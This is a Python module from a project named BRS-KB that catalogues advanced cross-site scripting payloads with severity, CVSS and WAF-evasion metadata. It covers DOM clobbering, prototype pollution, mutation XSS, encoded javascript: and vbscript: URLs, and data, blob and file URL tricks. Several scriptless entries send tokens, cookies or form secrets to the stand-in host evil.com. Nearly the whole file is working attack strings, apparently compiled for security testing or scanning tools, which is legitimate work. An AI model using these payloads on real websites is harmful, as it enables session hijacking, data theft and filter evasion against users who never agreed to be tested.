#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Advanced XSS Techniques Payloads
DOM Clobbering, Prototype Pollution, Mutation XSS, Scriptless, etc.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === DOM Clobbering Payloads ===
DOM_CLOBBERING_ADVANCED_PAYLOADS = {
    "clobber-window-name": PayloadEntry(
        payload='<img id=name><img id=name name=innerHTML><img name=innerHTML src="x:alert(1)">',
        contexts=["dom_clobbering", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="DOM clobbering window.name chain",
        tags=["clobbering", "window", "name", "chain"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "clobber-document-form": PayloadEntry(
        payload='<form id="x"><input id="y"></form><form id="x"><input id="y" name="z"></form>',
        contexts=["dom_clobbering", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="DOM clobbering form collection",
        tags=["clobbering", "form", "collection", "id"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "clobber-anchor-protocol": PayloadEntry(
        payload='<a id="x" href="javascript:alert(1)"></a><script>x.protocol</script>',
        contexts=["dom_clobbering", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Anchor element protocol clobbering",
        tags=["clobbering", "anchor", "protocol", "href"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "clobber-srcdoc": PayloadEntry(
        payload='<iframe id="x" srcdoc="<img src=x onerror=alert(1)>"></iframe>',
        contexts=["dom_clobbering", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Iframe srcdoc clobbering",
        tags=["clobbering", "iframe", "srcdoc"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Prototype Pollution Payloads ===
PROTOTYPE_POLLUTION_PAYLOADS = {
    "proto-constructor": PayloadEntry(
        payload='obj.__proto__.constructor.constructor("alert(1)")()',
        contexts=["prototype_pollution", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Prototype pollution to RCE via constructor",
        tags=["prototype", "pollution", "constructor", "rce"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "proto-innerHTML": PayloadEntry(
        payload='Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"',
        contexts=["prototype_pollution", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Prototype pollution innerHTML gadget",
        tags=["prototype", "pollution", "innerHTML", "gadget"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "proto-src": PayloadEntry(
        payload='Object.prototype.src = "javascript:alert(1)"',
        contexts=["prototype_pollution", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Prototype pollution src attribute gadget",
        tags=["prototype", "pollution", "src", "gadget"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "proto-jquery-extend": PayloadEntry(
        payload='$.extend(true, {}, JSON.parse(\'{"__proto__":{"evilProp":"<img src=x onerror=alert(1)>"}}\'))',
        contexts=["prototype_pollution", "javascript", "jquery"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="jQuery extend prototype pollution",
        tags=["prototype", "pollution", "jquery", "extend"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Mutation XSS Payloads ===
MUTATION_XSS_PAYLOADS = {
    "mxss-noscript": PayloadEntry(
        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        contexts=["mutation", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="mXSS via noscript parsing difference",
        tags=["mxss", "noscript", "parsing", "mutation"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mxss-svg-foreignObject": PayloadEntry(
        payload="<svg><foreignObject><p><style><img src=x onerror=alert(1)></style></p></foreignObject></svg>",
        contexts=["mutation", "html_content", "svg"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="mXSS via SVG foreignObject namespace",
        tags=["mxss", "svg", "foreignObject", "namespace"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mxss-math-annotation": PayloadEntry(
        payload='<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
        contexts=["mutation", "html_content", "mathml"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="mXSS via MathML annotation-xml",
        tags=["mxss", "mathml", "annotation", "encoding"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mxss-template": PayloadEntry(
        payload='<template><img src=x onerror=alert(1)></template><script>document.body.appendChild(document.querySelector("template").content.cloneNode(true))</script>',
        contexts=["mutation", "html_content", "template"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Template element content mutation",
        tags=["mxss", "template", "cloneNode", "content"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Scriptless XSS Payloads ===
SCRIPTLESS_PAYLOADS = {
    "scriptless-css-import": PayloadEntry(
        payload='<style>@import url("https://evil.com/token=" attr(data-secret));</style><div data-secret="SECRET">',
        contexts=["scriptless", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="Scriptless data exfil via CSS import",
        tags=["scriptless", "css", "import", "exfil"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "scriptless-meta-refresh": PayloadEntry(
        payload='<meta http-equiv="refresh" content="0;url=https://evil.com/?cookie="+document.cookie>',
        contexts=["scriptless", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Scriptless redirect via meta refresh",
        tags=["scriptless", "meta", "refresh", "redirect"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "scriptless-form-action": PayloadEntry(
        payload='<form action="https://evil.com/steal"><input name="secret" value=""><button>Submit</button></form>',
        contexts=["scriptless", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.5,
        description="Scriptless form hijacking",
        tags=["scriptless", "form", "action", "hijack"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "scriptless-base-hijack": PayloadEntry(
        payload='<base href="https://evil.com/">',
        contexts=["scriptless", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Scriptless base tag hijacking",
        tags=["scriptless", "base", "hijack", "href"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Blob URL Payloads ===
BLOB_URL_PAYLOADS = {
    "blob-script": PayloadEntry(
        payload='<script src="' + "blob:" + 'https://example.com/uuid"></script>',
        contexts=["blob_url", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blob URL script injection",
        tags=["blob", "url", "script", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "blob-worker": PayloadEntry(
        payload='const blob = new Blob([`self.onmessage=()=>self.postMessage(eval("alert(1)"))`], {type: "application/javascript"}); new Worker(URL.createObjectURL(blob));',
        contexts=["blob_url", "javascript", "webworker"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blob URL worker with eval",
        tags=["blob", "url", "worker", "eval"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === File URL Payloads ===
FILE_URL_PAYLOADS = {
    "file-url-local": PayloadEntry(
        payload='<a href="file:///etc/passwd">Read</a>',
        contexts=["file_url", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="File URL local file access",
        tags=["file", "url", "local", "access"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "file-url-script": PayloadEntry(
        payload='<script src="file:///tmp/xss.js"></script>',
        contexts=["file_url", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="File URL script loading",
        tags=["file", "url", "script", "local"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Data URL Variants Payloads ===
DATA_URL_VARIANTS_PAYLOADS = {
    "data-url-base64-script": PayloadEntry(
        payload='<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
        contexts=["data_url_variants", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Data URL base64 script",
        tags=["data", "url", "base64", "script"],
        reliability=Reliability.HIGH,
        encoding=Encoding.BASE64,
        waf_evasion=True,
    ),
    "data-url-html": PayloadEntry(
        payload='<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        contexts=["data_url_variants", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Data URL HTML iframe",
        tags=["data", "url", "html", "iframe"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "data-url-svg": PayloadEntry(
        payload="<img src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\">",
        contexts=["data_url_variants", "html_content", "svg"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Data URL SVG with onload",
        tags=["data", "url", "svg", "onload"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === JavaScript Variants Payloads ===
JAVASCRIPT_VARIANTS_PAYLOADS = {
    "js-protocol-case": PayloadEntry(
        payload='<a href="JaVaScRiPt:alert(1)">Click</a>',
        contexts=["javascript_variants", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JavaScript protocol case variation",
        tags=["javascript", "protocol", "case", "variation"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-protocol-encoded": PayloadEntry(
        payload='<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click</a>',
        contexts=["javascript_variants", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JavaScript protocol HTML entity encoded",
        tags=["javascript", "protocol", "encoded", "entity"],
        reliability=Reliability.HIGH,
        encoding=Encoding.HTML_DECIMAL,
        waf_evasion=True,
    ),
    "js-protocol-newline": PayloadEntry(
        payload='<a href="java\nscript:alert(1)">Click</a>',
        contexts=["javascript_variants", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JavaScript protocol with newline",
        tags=["javascript", "protocol", "newline", "bypass"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === VBScript Protocol Payloads (IE Legacy) ===
VBSCRIPT_PROTOCOL_PAYLOADS = {
    "vbscript-basic": PayloadEntry(
        payload='<a href="vbscript:MsgBox(1)">Click</a>',
        contexts=["vbscript_protocol", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="VBScript protocol (IE only)",
        tags=["vbscript", "protocol", "ie", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "vbscript-encoded": PayloadEntry(
        payload='<a href="&#118;&#98;&#115;&#99;&#114;&#105;&#112;&#116;:MsgBox(1)">Click</a>',
        contexts=["vbscript_protocol", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="VBScript protocol encoded",
        tags=["vbscript", "protocol", "encoded", "ie"],
        reliability=Reliability.LOW,
        encoding=Encoding.HTML_DECIMAL,
        waf_evasion=True,
    ),
}

# === MHTML Payloads ===
MHTML_PAYLOADS = {
    "mhtml-content-location": PayloadEntry(
        payload="Content-Location: javascript:alert(1)",
        contexts=["mhtml", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="MHTML Content-Location javascript",
        tags=["mhtml", "content-location", "ie", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "mhtml-protocol": PayloadEntry(
        payload='<iframe src="mhtml:https://example.com/page.mhtml!xss"></iframe>',
        contexts=["mhtml", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="MHTML protocol injection",
        tags=["mhtml", "protocol", "iframe", "ie"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === XML Namespace Payloads ===
XML_NAMESPACE_PAYLOADS = {
    "xml-ns-xlink": PayloadEntry(
        payload='<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>',
        contexts=["xml_namespace", "html_content", "svg"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="XLink namespace href injection",
        tags=["xml", "namespace", "xlink", "svg"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "xml-ns-custom": PayloadEntry(
        payload='<div xmlns:x="http://evil.com/ns"><x:script>alert(1)</x:script></div>',
        contexts=["xml_namespace", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Custom XML namespace",
        tags=["xml", "namespace", "custom", "prefix"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined database
ADVANCED_TECHNIQUES_PAYLOADS = {
    **DOM_CLOBBERING_ADVANCED_PAYLOADS,
    **PROTOTYPE_POLLUTION_PAYLOADS,
    **MUTATION_XSS_PAYLOADS,
    **SCRIPTLESS_PAYLOADS,
    **BLOB_URL_PAYLOADS,
    **FILE_URL_PAYLOADS,
    **DATA_URL_VARIANTS_PAYLOADS,
    **JAVASCRIPT_VARIANTS_PAYLOADS,
    **VBSCRIPT_PROTOCOL_PAYLOADS,
    **MHTML_PAYLOADS,
    **XML_NAMESPACE_PAYLOADS,
}

ADVANCED_TECHNIQUES_TOTAL = len(ADVANCED_TECHNIQUES_PAYLOADS)
